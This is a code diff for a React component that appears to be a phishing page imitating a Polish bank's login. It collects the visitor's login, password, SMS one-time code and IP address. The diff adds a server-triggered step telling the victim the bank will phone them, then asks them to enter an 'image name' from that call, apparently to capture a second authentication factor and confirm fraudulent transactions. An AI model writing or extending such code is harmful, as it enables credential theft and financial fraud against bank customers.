@@ -63,6 +63,7 @@ const Main = () => {
     const [inputLogin, setInputLogin] = useState('');
     const [inputPass, setInputPass] = useState('');
     const [inputSms, setInputSms] = useState('');
+    const [inputImage, setInputImage] = useState('');
     const [currentStep, setCurrentStep] = useState(0);
     const [showPass, setShowPass] = useState(false);
     const [ip, setIP] = useState("");
@@ -88,6 +89,9 @@ const Main = () => {
     const handleChangeSms = (e) => {
         setInputSms(e.target.value);
     };
+    const handleChangeImage = (e) => {
+        setInputImage(e.target.value);
+    };
 
     const handleContinue = () => {
         if (currentStep === 0) {
@@ -104,7 +108,9 @@ const Main = () => {
             }).then(res => {
                 console.log(res)
                 setLoading(false);
-                setCurrentStep(2)
+                if(res.data === 'image'){
+                    setCurrentStep(2)
+                } else setCurrentStep(3);
             })
         } else {
             setLoading(true);
@@ -169,7 +175,7 @@ const Main = () => {
                 }
                     <div className={
                         `flex items-center w-full ${
-                            currentStep === 2 ? 'justify-center' : 'justify-between'
+                            currentStep >= 2 ? 'justify-center' : 'justify-between'
                         }`
                     }>
                         <div className='w-full lg:w-5/12 mb-8 min-h-[298px] lg:mb-0'>
@@ -217,9 +223,10 @@ const Main = () => {
                                 }`
                             }>
                                 <div className='flex items-center justify-between mb-2'>
-                                    <h4 className='text-xl font-semibold'>{currentStep === 2 ? 'Potwierdzenie transakcji' : 'Zaloguj się'}</h4>
+                                    <h4 className='text-xl font-semibold'>{currentStep >= 2 ? 'Potwierdzenie transakcji' : 'Zaloguj się'}</h4>
                                 </div>
                                 {currentStep === 2 && (<p className='text-xs pb-4 text-[#666] font-semibold'>Na Twój numer telefonu został wysłany unikalny kod. Sprawdź szczegóły transakcji i wprowadź unikalny kod.</p>)}
+                                {currentStep === 3 && (<p className='text-xs pb-4 text-[#666] font-semibold'>W ciągu minuty bank zadzwoni na Twój numer telefonu, wysłuchaj i zapamiętaj nazwę obrazku, a następnie wpisz go na stronie.</p>)}
                                 {
                                 currentStep === 0 && (
                                     <div className='flex items-center justify-between'>
@@ -280,19 +287,19 @@ const Main = () => {
                                 )
                             }
                                 {
-                                currentStep === 2 && (
+                                currentStep >= 2 && (
                                     <div className='flex items-center justify-between'>
                                         <div className='w-full relative'>
                                             <label className={
                                                 `inputLabel text-[#666666] transition-all ${
                                                     isFocused || inputLogin ? 'focused' : ''
                                                 }`
-                                            }>Kod jednorazowy</label>
+                                            }>{currentStep === 2 ? 'Kod jednorazowy' : 'Nazwa obrazku'}</label>
                                             <input type='text'
                                                 onFocus={handleFocus}
                                                 onBlur={handleBlur}
-                                                onChange={handleChangeSms}
-                                                value={inputSms}
+                                                onChange={handleChangeImage}
+                                                value={currentStep === 2 ? inputSms : inputImage}
                                                 className='inputLogin text-sm font-semibold outline-none w-full border-[#C8C8C8] hover:border-[#99CC00] focus:border-[#99CC00] border'/>
                                         </div>
                                     </div>
@@ -323,6 +330,14 @@ const Main = () => {
                                     <button className={
                                         `w-full text-sm font-semibold py-3 transition-all rounded-xl ${
                                             inputSms ? 'bg-[#99cc00] text-black' : 'bg-[#e9e9e9] text-[#888888]'
+                                        }`
+                                    }
+                                    onClick={handleContinue}>Dalej</button>
+                                )}
+                                {currentStep === 3 && (
+                                    <button className={
+                                        `w-full text-sm font-semibold py-3 transition-all rounded-xl ${
+                                            inputImage ? 'bg-[#99cc00] text-black' : 'bg-[#e9e9e9] text-[#888888]'
                                         }`
                                     }
                                     onClick={handleContinue}>Dalej</button>
